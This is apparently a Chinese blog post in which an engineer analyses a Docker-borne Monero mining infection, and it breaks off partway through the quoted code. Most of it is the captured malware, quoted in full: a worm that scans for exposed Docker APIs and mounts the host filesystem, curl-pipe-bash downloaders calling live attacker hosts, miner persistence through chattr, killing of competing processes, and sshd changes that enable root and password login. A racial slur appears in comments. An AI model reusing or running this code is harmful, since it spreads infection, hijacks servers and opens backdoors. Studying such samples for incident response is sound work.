2020年本人接手一个项目，线上碰到个挖矿病毒，当时处理了一下，没有处理干净，过几个月发现他还有些脚本能运行，但是不影响线上，顺便就仔细研究一下，才发现当时解决的不够彻底。
这个病毒，腾讯云报的是loggerMiner,内容大差不差。
病毒应该是通过docker感染的，问了一下，线上部署docker的时候开放过几天2376端口，没有加ssl。可能就那个适合感染了。
主要症状就是cpu跑满，kill之后，重启又是如此。主要原因下面分析记录一下，自己运维水平一般，如有错误请指出，权当自己记录一下。

病毒会开一个screen，下载执行脚本。
```
curl -A scanner/1.5 -L http://xanthe.anondns.net:8080/files/mxutzh.sh | bash -s <script async src='/cdn-cgi/bm/cv/2172558837/api.js'></script></head>
```

这个mxutzh脚本我下载下来了：
主要是通过感染的服务器，继续感染其他机器
```bash
#!/bin/bash
pwn(){
prt=$2
randgen=$(curl -sL $1 | shuf | head -n 200)
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $randgen -p$prt --rate=$3 | awk '{print $6}'| zgrab --senders 200 --port $prt --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
for ipaddy in ${!rndstr}
do
echo "$ipaddy:$prt"
time docker -H tcp://$ipaddy:$2 run --rm -v /:/mnt alpine chroot /mnt /bin/sh -c "curl -A mx/$2 -sL http://138.68.14.52:8080/files/pop.sh | bash;" &
sleep 120
kill "$!"
done;
}

while true
do
pwn "$1" 2375 50000
pwn "$1" 2376 50000
pwn "$1" 2377 50000
pwn "$1" 4244 50000
pwn "$1" 4243 50000
done
```


成功之后下载执行这个脚本

```bash
	#!/bin/bash
	#shell popper
	#                                                                     $$\    $$$$$$\
	#                                                                   $$$$ |  $$  __$$\
	# $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\        $$\   $$\ \_$$ |  \__/  $$ |
	#$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|       \$$\ $$  |  $$ |   $$$$$$  |
	#$$ /  $$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /              \$$$$  /   $$ |  $$  ____/
	#$$ |  $$ |$$ |  $$ | \____$$\ $$   ____|$$ |              $$  $$<    $$ |  $$ |
	#\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\        $$  /\$$\ $$$$$$\ $$$$$$$$\
	# \______/ $$  ____/ \_______/  \_______| \_______|$$$$$$\\__/  \__|\______|\________|
	#          $$ | pwning to pwn                      \______|
	#          $$ | if this script helped you make some $$ mining monero, throw a little my way?
	#          \__| Monero: 47TmDBB14HuY7xw55RqU27EfYyzfQGp6qKmfg6f445eihemFMn3xPhs8e1qM726pVj6XKtyQ1zqC24kqtv8fXkPZ7bvgSPU
	#
	#
	#eyyy we gotz da shellz
	
	successgo(){
		sudo curl -A goteeeem/1.4 -sL http://xanthe.anondns.net:8080/files/xanthe | sudo bash -s
		curl -A shell-success/1.4 -sLo /dev/null https://iplogger.org/1Qnbe7
		date +"%r";
	}
	
	successgo
```

这个xanthe脚本如下：

```bash

		#!/bin/bash
		#thanks for everything
		#                                                                     $$\    $$$$$$\
		#                                                                   $$$$ |  $$  __$$\
		# $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\        $$\   $$\ \_$$ |  \__/  $$ |
		#$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|       \$$\ $$  |  $$ |   $$$$$$  |
		#$$ /  $$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /              \$$$$  /   $$ |  $$  ____/
		#$$ |  $$ |$$ |  $$ | \____$$\ $$   ____|$$ |              $$  $$<    $$ |  $$ |
		#\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\        $$  /\$$\ $$$$$$\ $$$$$$$$\
		# \______/ $$  ____/ \_______/  \_______| \_______|$$$$$$\\__/  \__|\______|\________|
		#          $$ | pwning to pwn                      \______|
		#          $$ | if this script helped you make some $$ mining monero, throw a little my way?
		#          \__| Monero: 47TmDBB14HuY7xw55RqU27EfYyzfQGp6qKmfg6f445eihemFMn3xPhs8e1qM726pVj6XKtyQ1zqC24kqtv8fXkPZ7bvgSPU
		#
		#
		initializego() {
		        if test -f /tmp/.firstrun-update.pid; then
		                echo "pid exists, skip to next section"
		        else
		                curl -A xanthe-start/1.4 -sL http://xanthe.anondns.net:8080/files/fczyo | sudo bash -s >/dev/null 2>&1
		                echo "################################################fczyo DONE######################################################"
		                curl -A xanthe-start/1.4 -sL http://xanthe.anondns.net:8080/files/xesa.txt | sudo bash -s >/dev/null 2>&1
		                echo "################################################xesa DONE######################################################"
		                ## Reporting in
		                PROC=`(nproc --all)`
		                MEM=`(free -h | gawk '/Mem:/{print $2}' | rev | cut -c 2- | rev | xargs printf "%.*f\n" 0)`
		                echo "p:$PROC, m:$MEM"
		                #https://iplogger.org/10xNq3
		                curl -A xanthecheck-$PROC.$MEM -sL https://iplogger.org/10xNq3 >/dev/null
		                curl -A xanthecheck-$PROC.$MEM -sL http://xanthe.anondns.net:8080/files/init >/dev/null
		                mkdir /tmp/
		                touch /tmp/.firstrun-update.pid
		                #chattr +ia /tmp/.firstrun.pid;
		        fi
		}
		
		filegetgo() {
		        if test -f /var/tmp/bbb/config.json; then
		                echo "config file exists"
		        else
		                echo "config file does not exist, downloading"
		                #curl -sL -o /tmp/eee http://xanthe.anondns.net:8080/files/lifxvf; chmod +x /tmp/eee ; /tmp/eee ; rm -rf /tmp/eee
		                curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
		                if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
		                        echo "correct"
		                else
		                        curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://34.82.205.130:8080/tcazmp.jpg
		                        if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
		                                echo "correct"
		                        else
		                                curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://165.22.48.169:8080/tcazmp.jpg
		                                if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
		                                        echo "correct"
		                                else
		                                        curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
		                                        if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
		                                                echo "correct"
		                                        else
		                                                curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
		                                                if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
		                                                        echo "correct"
		                                                else
		                                                        curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/config.json
		                                                fi
		                                        fi
		                                fi
		                        fi
		                fi
		        fi
		
		        #if test -f /var/tmp/bbb/bbb || test -f /tmp/bbb/bbb ; then
		        if test -f /var/tmp/bbb/bbb; then
		                echo "main bbb file exists"
		                if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
		                        echo "file CHECKSUM match"
		                else
		                        echo "file exists but is not correct checksum, need to redownload"
		                        #FIRST***** CHECH IF CURRENTLY DOWNLOADING if [ $? -eq 0 ]
		                        ps aux | grep curl | grep -w /var/tmp/bbb/bbb | grep -v grep
		                        if [ $? -eq 0 ]; then
		                                echo "already downloading, Skip downloading"
		                        else
		                                echo "not currently downloading, starting download"
		                                chattr -R -ia /var/tmp/bbb/
		                                rm -rf /var/tmp/bbb/bbb
		                                filegetgo
		                        fi
		
		                fi
		        else
		                echo "bbb does not exist, downloading"
		                echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                chattr -R -iau /var/tmp || chattr -iau /tmp
		                sysctl -w vm.nr_hugepages="$(nproc --all)"
		                #mkdir -p /tmp/bbb;
		                #mkdir /var/tmp/bbb
		                urldirect1="http://xanthe.anondns.net:8080/files/"
		                urldirect2="http://34.82.205.130:8080/"
		                urldirect3="http://165.22.48.169:8080/"
		                urldirect4="https://up.nerde.pw/selif/"
		                urldirect5="https://junglecoder.com/linx/selif/"
		                urldirect6="https://so.urceco.de/selif/"
		                urldirect7="https://fs.ikl.sh/selif/"
		                urldirect8="https://share.dev0.sh/selif/"
		                urldirect9="http://uupload.ir/files/"
		                urlscrape1="https://anonfiles.com/"
		                urlscrape2="https://share-online.is/"
		                urlscrape3="https://myfile.is/"
		                urlscrape4="https://rapidshare.nu/"
		                urlscrape5="https://upload.st/"
		                urlscrape6="https://file.bz/"
		                urlscrape7="https://letsupload.cc/"
		                urlscrape8="https://fuskbugg.se/"
		                directarray1=("adnckil" "adnckil2")
		                #directarray2=("dE2dfsS3.jpg" "tcER5qnE.jpg")
		                directarray2=("adnckil" "adnckil2")
		                directarray3=("adnckil" "adnckil2")
		                #directarray3=("vh7jgqda.jpg" "51wqkrzf.jpg" "0y96i6r3.jpg" "92m68yn0.jpg" "oz8gffce.jpg" "xz9ver52.jpg" "vszyhtlo.jpg" "3vorlsof.jpg" "x464bmyh.jpg" "1wn5sjgi.jpg" "504xvir3.jpg" "qbhhx8jt.jpg" "4kc0x30m.jpg" "xo0czrnc.jpg" "e7bq6gov.jpg" "oay9zcom.jpg" "i8bo9g0e.jpg" "ar2h5i5i.jpg" "yeyii8sb.jpg" "rg991e3o.jpg")
		                directarray4=("28gqdic2.jpg" "463lt6o5.jpg" "2g1d19fy.jpg" "aknrg7b6.jpg" "ql5g92kw.jpg" "2ckzymod.jpg" "vfv30qum.jpg" "hnw1v0or.jpg" "fn79tf4y.jpg" "bmzwju5c.jpg" "t35bg5us.jpg" "1bm7lab3.jpg" "n6n63wm6.jpg" "b3dnupoz.jpg" "sfrjr8cj.jpg" "fjcj2hjd.jpg" "83f8ceph.jpg" "jlyd18zv.jpg" "o1ernrbu.jpg" "iiczqu1o.jpg")
		                directarray5=("a54v1t8v.file" "3tyfylw0.file" "qg2835kn.file" "1crd48rn.file" "4x6hq0nk.file" "63s2cl1n.file" "q5tj1q8q.file" "doli3rtr.file" "arbsqgno.file" "pll7l46n.file" "i0xrbsal.file" "x1tpgnc9.file" "5ukpoep5.file" "p3b913tz.file" "3qae42b7.file" "l1ytxkl1.file" "2y9kzh5v.file" "c6afohpe.file" "gwk77wyw.file" "fhthykey.file")
		                directarray6=("2rhw89y3.jpg" "roiuwr27.jpg" "gkq2f70v.jpg" "rfust8yv.jpg" "v3q4w0bf.jpg" "pckqx5vk.jpg" "0oso0g8x.jpg" "rsb3dtux.jpg" "9vghk7ox.jpg" "c4rlmoam.jpg" "97lycgks.jpg" "hljjrsq7.jpg" "d9bet2ek.jpg" "u6hrfpum.jpg" "few7oyax.jpg" "ip1gbtxq.jpg" "o5ud9ulk.jpg" "uoyidjbw.jpg" "4cw5r0qf.jpg" "eklup7oz.jpg")
		                directarray7=("ywtm4i58.jpg" "kr8fggiw.jpg" "pjgr3fc1.jpg" "oootb4z1.jpg" "6ny0ahyt.jpg" "3ju265c8.jpg" "95xn9b5g.jpg" "rrngmswt.jpg" "nzzayq5k.jpg" "gnea1g25.jpg" "f652awt0.jpg" "ir599zbt.jpg" "xx2xysot.jpg" "lbp90uda.jpg" "hyqje4iw.jpg" "c5mudh5x.jpg" "omt2cobn.jpg" "336yfadt.jpg" "ct4atkmb.jpg" "d24rt78d.jpg")
		                directarray8=("eha7jz9a.elf" "cy17gh5q.elf" "oqnbr34y.elf" "nudfxbjx.elf" "5qk7iklu.elf" "dquq70rd.elf" "gu58v9fk.elf" "1ui9zdxu.elf" "0kxjny09.elf" "s7njp6yw.elf" "787arv0d.elf" "eub16ghi.elf" "4yuldx99.elf" "o79d4luc.elf" "ev92sjev.elf" "viaqsrfj.elf" "k7xuw07a.elf" "81o5y14b.elf" "cirvsu8a.elf" "i4pxkpyj.elf")
		                directarray9=("pzab_bbp.jpg" "qk0y_bbp.jpg" "cfw2_bbp.jpg" "skb7_bbp.jpg")
		                scrapearray1=("TeG5Q1M4n4" "r6LcQbMbn3" "ddwcb4D8n3")
		                scrapearray3=("7befb8Dbnc" "p2fbb1D2nc" "f1g0b3Dana" "Z9g6bfD4n1" "P8h0b7D7n5" "Ffi9bbDcnd" "3bjeb6D3n9" "r7k8b8D6n3" "bfl4b2D1ne" "Nfl5bdD5nd" "51m2b4D0ne" "51n4b7D6ne" "d5oab4D0n4" "Vdoab8Den1" "L2pfb4Dcn6" "Fcq7b0Dfn5" "R6rcb1Dcn9" "J1tbb9Dana" "V6uabeD0nf" "f1web5D5ne")
		                scrapearray4=("9febb4D4n3" "rcf4bfDfne" "j6gcbdDcn0" "b8h6b8D9n0" "R9hebbD1n3" "H2i2b1D6n9" "53j9b5D4n5" "t5k4b9D4n1" "ffl9bbD5n5" "R0l9b0D2n9" "71m2b9D6n2" "7en3b5Dan2" "j2o8bbD4n0" "Xbodb0Dfn0" "P8p4bcDan1" "Haq4bfD4n8" "T4r2b2Ddnc" "N4t2b5Dbne" "XeudbeDfn3" "j1wfbcDan7")
		                scrapearray5=("B3e9b3D7nd" "tdfdbdD4n0" "lbgcbbD0n0" "d9hdb7D1n9" "T5hab0D2nb" "J4idb0Dbnf" "9ejabdD2n3" "v5k0b7D4nb" "h1l2b6Den8" "Tal1b5D3n3" "9fmab4Dbn5" "9fn1b0D1n6" "l8o2b1D5n2" "Z1o0b1D0n4" "R4pfbfD5n9" "Jbq2bbD3ne" "X4r4b2D7na" "P7t7bdDfn9" "Z0u5bcD4n1" "ldw4bfD0n6")
		                scrapearray6=("Dee7baDfn4" "v1f6b0D0nc" "n3gbbeDcnf" "fch2b6Den0" "b0i5b8Dan7" "Nbibb1D2nc" "B7j8b3Dana" "x8k6b1D6n6" "j0l6b1D4n7" "V2l2b5D2n3" "BamebdDcnc" "Bfn6b4D0n2" "n1o0beD1n4" "ddp2b8Dbne" "T6p3b7Danb" "N1qfb4D9n3" "Z1rcb8Dfne" "T2t5b5Dan4" "b3v6b4D3nb" "55w4bfD0n9")
		                scrapearray7=("F9e6bdD6na" "xefbbaDen2" "p3g6bdD4ne" "hbh6b5Den9" "d4i4bcD6n1" "Pbi0b2Dfnb" "Fej7b5Dcn7" "14k0bfD6nd" "n2l3beDfn0" "Xdldb5Dcnd" "FamabaDen5" "D3n9beD1n4" "pbo3bcDcn6" "fcpab2D8n9" "Vepeb2Dfn4" "Rbq9b2Dane" "b7scbdD7nd" "V5tcb3Ddn3" "dcveb4D8n9" "J1wcb6D9nf")
		                scrapearray8=("daJcp8Men0" "veJ1peM1n6")
		                #curl --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]} || curl --create-dirs -sL -o /tmp/bbb/bbb $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]};
		                curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]}
		                #if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb" || md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /tmp/bbb/bbb"
		                if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
		                        #chmod +x /var/tmp/bbb/bbb || chmod +x /tmp/bbb/bbb
		                        chmod +x /var/tmp/bbb/bbb
		                        chattr +ia /var/tmp/bbb/bbb
		                        sysctl -w vm.nr_hugepages=$(nproc --all)
		                        echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                        #/var/tmp/bbb/bbb || /tmp/bbb/bbb
		                        /var/tmp/bbb/bbb
		                        sleep 10
		                        chattr +ia /var/tmp/bbb/config.json
		                        chmod 600 /var/tmp/bbb/log.log
		                else
		                        curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]}
		                        if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
		                                chmod +x /var/tmp/bbb/bbb
		                                chattr +ia /var/tmp/bbb/bbb
		                                sysctl -w vm.nr_hugepages=$(nproc --all)
		                                echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                                /var/tmp/bbb/bbb
		                                sleep 10
		                                chattr +ia /var/tmp/bbb/config.json
		                                chmod 600 /var/tmp/bbb/log.log
		                        else
		                                curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect3${directarray3[$RANDOM % ${#directarray3[@]}]}
		                                if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
		                                        chmod +x /var/tmp/bbb/bbb
		                                        chattr +ia /var/tmp/bbb/bbb
		                                        sysctl -w vm.nr_hugepages=$(nproc --all)
		                                        echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                                        /var/tmp/bbb/bbb
		                                        sleep 10
		                                        chattr +ia /var/tmp/bbb/config.json
		                                        chmod 600 /var/tmp/bbb/log.log
		                                else
		                                        rm -rf /var/tmp/bbb/bbb
		                                        echo "when the walls fell!!!! trying a re download"
		                                        sysctl -w vm.nr_hugepages=$(nproc --all)
		                                        echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                                        curl -A thewallsfell/1.0 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
		                                        curl -A thewallsfell/1.0 --create-dirs -Lo /var/tmp/bbb/bbb http://165.22.48.169:8080/adnckil2
		                                        curl -A theworldisending/1.3 -sLo /dev/null https://iplogger.org/1Rfhy7
		                                        chmod +x /var/tmp/bbb/bbb
		                                        chattr +ia /var/tmp/bbb/bbb
		                                        /var/tmp/bbb/bbb
		                                        sleep 10
		                                        chattr +ia /var/tmp/bbb/config.json
		                                        chmod 600 /var/tmp/bbb/log.log
		                                fi
		                        fi
		                fi
		        fi
		}
		
		filesetupgo() {
		        #chattr -iauR /var/tmp/bbb/
		        mount | grep noexec | grep /tmp | grep -vw grep
		        if [ $? -eq 1 ]; then
		                echo "good to go - already running"
		        else
		                echo "remounting"
		                mount -o remount,exec /var/tmp
		                mount -o remount,exec /tmp
		        fi
		        j=0
		        for i in $(ps -fe | grep 'bbb' | grep -v grep | grep -v http | awk '{print $2}'); do
		                let j=j+1
		                if [ $j -ge 2 ]; then
		                        echo "Killing process $i"
		                        kill -9 $i
		                fi
		        done
		        ps -fe | grep -w bbb | grep -v grep | grep -v http
		        if [ $? -eq 0 ]; then
		                echo "RUNNING"
		                curl -A xanthe-running/1.2 -4sL https://iplogger.org/1iGce7 >/dev/null
		        else
		                echo "ERROR PROGRAM NOT RUNNING"
		                #mkdir -p /var/tmp/bbb
		                if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
		                        echo "file checksums match, proceed to relaunch"
		                        filestartgo
		                else
		                        echo "file checksums dont match...redownloading"
		                        filegetgo
		                fi
		        fi
		}
		filestartgo() {
		
		        #mkdir /opt/bbb
		        #curl -A nigger/1.3 -Lo /opt/bbb/bbb http://138.68.14.52:8080/files/adnckil
		        #curl -A nigger/1.3 -Lo /opt/bbb/config.json http://138.68.14.52:8080/files/iqmjlf.jpg
		        #chmod +x /opt/bbb/bbb
		        chattr -ia /var/tmp/bbb/bbb
		        chmod +x /var/tmp/bbb/bbb
		        chattr +ia /var/tmp/bbb/bbb
		
		        chattr +ia /var/tmp/bbb/config.json
		        chattr +ia /var/tmp/bbb/config.json
		        chmod 600 /var/tmp/bbb/log.log
		
		        #chattr -iauR /tmp/bbb/
		        #chattr -iauR /opt/bbb/bbb
		        #curl -sL https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py  | python - start --port=5710 --log=false;
		        #ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
		        #ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
		        ps aux | grep -vw /var/tmp/bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
		        ps -fe | grep -w /var/tmp/bbb/bbb | grep -v grep | grep -v http
		        if [ $? -eq 0 ]; then
		                echo "RUNNING"
		        else
		                echo "Oops, not running.. lets get this party started!"
		                #sysctl -w vm.nr_hugepages=$(nproc --all)
		                #echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                #chmod +x /opt/bbb/bbb
		                #/opt/bbb/bbb
		                sysctl -w vm.nr_hugepages="$(nproc --all)"
		                echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                #chmod +x /var/tmp/bbb/bbb
		                /var/tmp/bbb/bbb
		                sleep 10s
		                ps -fe | grep -w /var/tmp/bbb/bbb | grep -v grep | grep -v http
		                if [ $? -eq 0 ]; then
		                        echo "NOW RUNNING"
		                else
		                        echo "Oh FUCK, Still not running, trying again!"
		                        sysctl -w vm.nr_hugepages="$(nproc --all)"
		                        echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		                        /var/tmp/bbb/bbb -c /var/tmp/bbb/config.json
		                fi
		        fi
		}
		
		#DEPRECIATED
		#filerungo(){
		##mkdir /opt/bbb
		#curl -A nigger/1.4 -Lo /var/tmp/bbb/bbb http://xanthe.anondns.net:8080/files/adnckil
		#curl -A nigger/1.4 -Lo /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/iqmjlf.jpg
		#chmod +x /var/tmp/bbb/bbb
		#chattr -iauR /var/tmp/bbb/
		#chattr -iauR /var/tmp/bbb/bbb
		#curl -sL https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py  | python - start --port=5710 --log=false;
		#ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
		#ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
		#if [ $? -eq 0 ]
		#then
		#echo "RUNNING"
		#else
		#sysctl -w vm.nr_hugepages="$(nproc --all)"
		#echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		#chmod +x /var/tmp/bbb/bbb
		#/var/tmp/bbb/bbb
		#sleep 10s;
		#ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
		#if [ $? -eq 0 ]
		#then
		#echo "NOW RUNNING"
		#else
		#sysctl -w vm.nr_hugepages="$(nproc --all)"
		#echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		#/var/tmp/bbb/bbb -c /var/tmp/bbb/config.json
		#fi
		#fi
		#}
		
		sshdconfig() {
		        chattr -ia /etc/ssh/sshd_config
		        chmod 644 /etc/ssh/sshd_config
		        echo "running sshd config"
		        #-e 's/PermitRootLogin yes/PermitRootLogin prohibit-password/g'
		        #echo "" >> /etc/ssh/sshd_config;
		        #echo "PermitRootLogin yes" >> /etc/ssh/sshd_config;
		        cat /etc/ssh/sshd_config | grep -iw "#Port 22" | grep -v grep >/dev/null
		        if [ $? -eq 0 ]; then
		                needreset=1
		                chattr -ia /etc/ssh/sshd_config
		                chmod 644 /etc/ssh/sshd_config
		                sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
		                #chmod 644 /etc/ssh/sshd_config;
		                chattr +ia /etc/ssh/sshd_config
		        else
		                echo "blank response"
		        fi
		
		        cat /etc/ssh/sshd_config | grep -iw "Port 51360" | grep -v grep >/dev/null
		        if [ $? -eq 0 ]; then
		                echo "already exists"
		        else
		                echo "does not exist"
		                needreset=1
		                chattr -ia /etc/ssh/sshd_config
		                chmod 644 /etc/ssh/sshd_config
		                sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
		                echo "Port 51360" >>/etc/ssh/sshd_config
		                #chmod 644 /etc/ssh/sshd_config;
		                chattr +ia /etc/ssh/sshd_config
		        fi
		
		        cat /etc/ssh/sshd_config | grep -iw "PermitRootLogin" | grep -v grep >/dev/null
		        if [ $? -eq 0 ]; then
		                needreset=1
		                echo "PermitRootLogin line does exist"
		                chattr -ia /etc/ssh/sshd_config
		                chmod 644 /etc/ssh/sshd_config
		                #echo "" >> /etc/ssh/sshd_config;
		                echo "checking if PermitRootLogin disabled"
		                echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
		                #sed -i '/.PermitRootLogin*/d' /etc/ssh/sshd_config;
		                sed -i -e 's/\#PermitRootLogin/PermitRootLogin/g' -e 's/\PermitRootLogin no/PermitRootLogin yes/g' -e 's/PermitRootLogin without-password/PermitRootLogin yes/g' -e 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
		                chmod 600 /etc/ssh/sshd_config
		                chattr +ia /etc/ssh/sshd_config
		                echo "successfully re-enabled PermitRootLogin"
		        else
		                echo "line does not exist at all, enter new line into file"
		                #echo "" >> /etc/ssh/sshd_config;
		                sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
		                echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
		                needreset=1
		        fi
		
		        cat /etc/ssh/sshd_config | grep -iw "PasswordAuthentication" | grep -v grep >/dev/null
		        if [ $? -eq 0 ]; then
		                needreset=1
		                echo "PasswordAuthentication line does exist"
		                chattr -ia /etc/ssh/sshd_config
		                chmod 644 /etc/ssh/sshd_config
		                #echo "" >> /etc/ssh/sshd_config;
		                echo "checking if PasswordAuthentication disabled"
		                echo "PasswordAuthentication yes" >>/etc/ssh/sshd_config
		                #sed -i '/.PasswordAuthentication*/d' /etc/ssh/sshd_config;
		                sed -i -e 's/\#PasswordAuthentication/PasswordAuthentication/g' -e 's/\PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
		                chmod 600 /etc/ssh/sshd_config
		                chattr +ia /etc/ssh/sshd_config
		                echo "successfully re-enabled PasswordAuthentication"
		        else
		                echo "line does not exist at all, enter new line into file"
		                #echo "" >> /etc/ssh/sshd_config;
		                sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
		                echo "PasswordAuthentication yes" >>/etc/ssh/sshd_config
		                needreset=1
		        fi
		
		        cat /etc/ssh/sshd_config | grep -iw "GSSAPIAuthentication" | grep -v grep >/dev/null
		        if [ $? -eq 0 ]; then
		                needreset=1
		                echo "PubkeyAuthentication line does exist"
		                chattr -ia /etc/ssh/sshd_config
		                chmod 644 /etc/ssh/sshd_config
		                #echo "" >> /etc/ssh/sshd_config;
		                echo "checking if PubkeyAuthentication disabled"
		                sed -i -e 's/\#PubkeyAuthentication/PubkeyAuthentication/g' -e 's/\PubkeyAuthentication no/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
		                chmod 600 /etc/ssh/sshd_config
		                chattr +ia /etc/ssh/sshd_config
		                echo "successfully re-enabled PubkeyAuthentication"
		        else
		                echo "line does not exist at all, enter new line into file"
		                echo "" >>/etc/ssh/sshd_config
		                echo "PubkeyAuthentication yes" >>/etc/ssh/sshd_config
		                needreset=1
		        fi
		
		        cat /etc/ssh/sshd_config | grep -iw "GSSAPIAuthentication" | grep -v grep >/dev/null
		        if [ $? -eq 0 ]; then
		                needreset=1
		                echo "GSSAPIAuthentication line does exist"
		                chattr -ia /etc/ssh/sshd_config
		                chmod 644 /etc/ssh/sshd_config
		                #echo "" >> /etc/ssh/sshd_config;
		                echo "checking if GSSAPIAuthentication enabled"
		                sed -i -e 's/GSSAPIAuthentication yes/GSSAPIAuthentication no/g' /etc/ssh/sshd_config
		                chmod 600 /etc/ssh/sshd_config
		                chattr +ia /etc/ssh/sshd_config
		                echo "successfully DISABLED GSSAPIAuthentication"
		        else
		                echo "line does not exist at all, enter new line into file"
		                echo "" >>/etc/ssh/sshd_config
		                echo "GSSAPIAuthentication yes" >>/etc/ssh/sshd_config
		                needreset=1
		        fi
		
		        cat /etc/ssh/sshd_config | grep -iw "GSSAPICleanupCredentials" | grep -v grep >/dev/null
		        if [ $? -eq 0 ]; then
		                needreset=1
		                echo "GSSAPICleanupCredentials line does exist"
		                chattr -ia /etc/ssh/sshd_config
		                chmod 644 /etc/ssh/sshd_config
		                #echo "" >> /etc/ssh/sshd_config;
		                echo "checking if GSSAPICleanupCredentials enabled"
		                sed -i -e 's/GSSAPICleanupCredentials yes/GSSAPICleanupCredentials no/g' /etc/ssh/sshd_config
		                chmod 600 /etc/ssh/sshd_config
		                chattr +ia /etc/ssh/sshd_config
		                echo "successfully DISABLED GSSAPICleanupCredentials"
		        else
		                echo "line does not exist at all, enter new line into file"
		                echo "" >>/etc/ssh/sshd_config
		                echo "GSSAPICleanupCredentials yes" >>/etc/ssh/sshd_config
		                needreset=1
		        fi
		        chmod 600 /etc/ssh/sshd_config
		        chattr +ia /etc/ssh/sshd_config
		        echo "sshd config done"
		}
		
		resetsshgo() {
		        if [ "$needreset" -eq "0" ]; then
		                echo "no need"
		        else
		                sleep 10
		                /etc/init.d/ssh restart
		                /etc/init.d/sshd restart
		                /etc/rc.d/sshd restart
		                service ssh restart
		                service sshd restart
		                systemctl start ssh
		                systemctl restart ssh
		                scw-fetch-ssh-keys --upgrade
		        fi
		}
		
		scancheck() {
		        echo "scan check started"
		        PROC=`(nproc --all)`
